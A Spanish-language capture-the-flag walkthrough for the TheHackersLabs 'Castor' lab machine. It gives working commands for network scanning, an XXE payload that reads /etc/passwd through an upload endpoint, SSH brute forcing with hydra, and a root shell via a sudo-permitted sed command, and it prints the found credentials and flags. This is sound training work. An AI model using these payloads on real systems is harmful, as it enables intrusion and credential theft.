# **Castor - TheHackersLabs**

## **Información General**

- **Plataforma:** TheHackersLabs
- **Nombre:** Castor
- **IP:** `192.168.80.73`
- **Dificultad:** Easy/Medium
- **Sistema Operativo:** Debian Linux
- **Objetivo:** Obtener acceso root

---

---

## **Reconocimiento**

### **Descubrimiento de hosts**

Se identificaron los equipos activos en la red local con `arp-scan`:

```bash
arp-scan -I eth0 --localnet
```

**Resultado:**
```
192.168.80.73   08:00:27:0b:9c:e9       PCS Systemtechnik GmbH
```

---

### **Modo PRO**

#### **Escaneo básico en un rango específico:**
```bash
sudo netdiscover -i eth0 -r 192.168.1.0/24
```

#### **Escaneo pasivo (solo escucha):**
```bash
sudo netdiscover -i wlan0 -p
```

#### **Escaneo automático (rangos locales comunes):**
```bash
sudo netdiscover
```

---

### **Confirmación con Nmap**

```bash
nmap -sn 192.168.80.0/24
```

**Hosts detectados:**
- Router
- iPhone
- Máquina víctima: **TheHackersLabs-Castor**

---

## **Escaneo de Puertos**

### **Escaneo TCP completo**
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.80.73 -oN Escaneo_TCP
```

**Puertos abiertos:**
| Puerto | Servicio |
|--------|----------|
| 22     | SSH      |
| 80     | HTTP     |

---

### **Detección de servicios**
```bash
nmap -sCV -p22,80 192.168.80.73
```

**Resultado:**
```
22/tcp open  ssh     OpenSSH 9.2p1 Debian
80/tcp open  http    Apache httpd 2.4.62
```

---

## **Enumeración Web**

### **Título web:**
**CastorTech | Madera Sostenible**

---

### **Fuzzing de directorios con Gobuster**
```bash
gobuster dir -u http://192.168.80.73/ \
-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
-x php,html,txt
```

**Resultados relevantes:**
- `/uploads`
- `/upload.php`
- `/server-status`

---

### **Análisis de `upload.php`**

#### **Prueba básica con `curl`:**
```bash
curl -X POST http://192.168.80.73/upload.php -d "test=hola"
```
**Respuesta:** Sugirió procesamiento XML.

---

### **Explotación XXE**

#### **Archivo `test.xml`:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
<data>&xxe;</data>
</root>
```

#### **Petición con `curl`:**
```bash
curl -X POST http://192.168.80.73/upload.php \
-H "Content-Type: application/xml" \
--data-binary @test.xml
```

**Resultado:** Se obtuvo el contenido de `/etc/passwd`.

---

### **Usuario identificado**
```bash
castorcin:x:1001:1001:castorcin,,,:/home/castorcin:/bin/bash
```

---

## **Acceso Inicial**

### **Fuerza bruta SSH con Hydra**
```bash
hydra -t 4 -vV \
-L user.txt \
-P diccionario.txt \
-e nsr 192.168.80.73 ssh
```

**Credenciales encontradas:**
- **Usuario:** `castorcin`
- **Password:** `chocolate`

---

### **Acceso SSH**
```bash
ssh castorcin@192.168.80.73
```

---

### **Obtención de flag de usuario**
```bash
cat user.txt
```

**Flag:**
```
THL{JDBNASJNAdnnasdkasdaCastorcito}
```

---

## **Escalada de Privilegios**

### **Enumeración de `sudo`**
```bash
sudo -l
```

**Resultado:**
```
(ALL : ALL) NOPASSWD: /usr/bin/sed
```

---

### **Explotación de `sed`**
Se aprovechó el binario permitido para obtener shell root:
```bash
sudo sed -n '1e exec sh 1>&0' /etc/hosts
```

**Shell root obtenida:**
```bash
whoami
# root
```

---

## **Captura de Flags**

### **Root Flag**
```bash
cd /root
cat root.txt
```

**Flag:**
```
THL{asdmaskdmasdkCASTOR}
```
